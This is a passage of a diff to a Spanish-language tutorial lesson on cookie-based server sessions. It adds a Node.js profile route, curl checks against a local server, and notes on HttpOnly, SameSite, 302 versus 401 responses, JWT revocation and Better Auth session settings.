+  if (url.pathname === "/perfil" && peticion.method === "GET") {
+    if (!usuario) {
+      respuesta.writeHead(302, { Location: "/" });
+      return respuesta.end();
+    }
+    const sesion = sesiones.get(leerCookies(peticion).sid);
+    const caduca = new Date(sesion.caduca).toLocaleTimeString("es-MX", {
+      timeZone: "America/Mexico_City",
+      hourCycle: "h23",
+    });
+    return html(respuesta, `<h1>Perfil de ${escapar(usuario.nombre)}</h1><p>Tu sesión caduca a las ${caduca} (hora de México).</p>`);
+  }
+```
+
+Reinicia el servidor y comprueba los dos casos:
+
+```bash
+curl -s -o /dev/null -c tarro.txt -X POST http://localhost:3002/login -d "email=dani@example.com&contrasena=contrasena-segura-123"
+curl -s -b tarro.txt http://localhost:3002/perfil
+curl -s -i http://localhost:3002/perfil
+rm tarro.txt
+```
+
+```text
+<!doctype html><html lang="es"><head><meta charset="utf-8"><title>Sesiones</title></head><body><h1>Perfil de Dani</h1><p>Tu sesión caduca a las 04:37:40 (hora de México).</p></body></html>
+HTTP/1.1 302 Found
+Location: /
+```
+
+(La hora será la de tu login más una hora). Para los puntos 1 y 2, en esta plataforma verás `better-auth.session_token` y `better-auth.session_data` (las dos con _HttpOnly_ marcado, _SameSite_ `Lax` y, en producción, _Secure_ y el prefijo `__Secure-`). `document.cookie` devuelve una cadena vacía, porque las dos son `HttpOnly` y la plataforma no crea cookies legibles: el tema se guarda en `localStorage`.
+
+<Callout type="risk">
+
+- **Una página privada que redirige con `302`** es correcta para navegadores. Una API debe responder `401` (un `fetch` que recibe un `302` lo seguiría y obtendría el HTML del formulario de login en lugar de un error claro). Esta plataforma hace exactamente esa distinción en su _middleware_.
+- **`sesiones.get(...)` justo después de `usuarioDeLaPeticion`** es seguro aquí porque esa función ya comprobó que la sesión existe y no ha caducado. Si separas el código en funciones distintas, no des por hecho que la sesión sigue ahí: vuelve a comprobarla.
+
 </Callout>
 
 <Callout type="mastery">
-  Entiendes cómo sabe tu servidor quién eres en cada petición y puedes justificar cada atributo de
-  una cookie de sesión.
+
+Entiendes cómo tu servidor sabe quién eres en cada petición: el login crea una sesión y responde con `Set-Cookie`, el navegador devuelve la cookie en cada petición, `HttpOnly` impide que JavaScript la lea, `SameSite` la protege de otras webs, y el _logout_ borra la sesión en el servidor. Sabes por qué una sesión se puede revocar y un JWT no.
+
 </Callout>
 
 ## Resumen
 
-- HTTP no tiene memoria: el navegador envía una cookie en cada petición.
-- `Set-Cookie` la crea; el navegador la devuelve automáticamente.
-- `HttpOnly` frena el robo por XSS, `Secure` exige HTTPS y `SameSite` frena el CSRF.
-- Sesión en servidor = identificador en la cookie + datos en la base de datos; revocable al instante.
-- La sesión, en cookie `HttpOnly`; `localStorage`, solo para datos no sensibles.
+- HTTP no tiene estado: el servidor reconoce al usuario por una cookie que el navegador envía sola en cada petición.
+- Sesión en servidor: la cookie lleva un identificador aleatorio y los datos viven en el servidor; se revoca borrándola.
+- Atributos clave: `HttpOnly` (JavaScript no la lee), `Secure` (solo HTTPS), `SameSite=Lax` (no viaja desde otras webs), `Max-Age` (caducidad).
+- Token firmado (JWT): los datos viajan en el token, legibles pero no modificables; no se puede revocar antes de que caduque.
+- Better Auth: sesión en MongoDB con cookie firmada de 30 días, más una caché firmada de 5 minutos; en producción, `Secure` y el prefijo `__Secure-`.
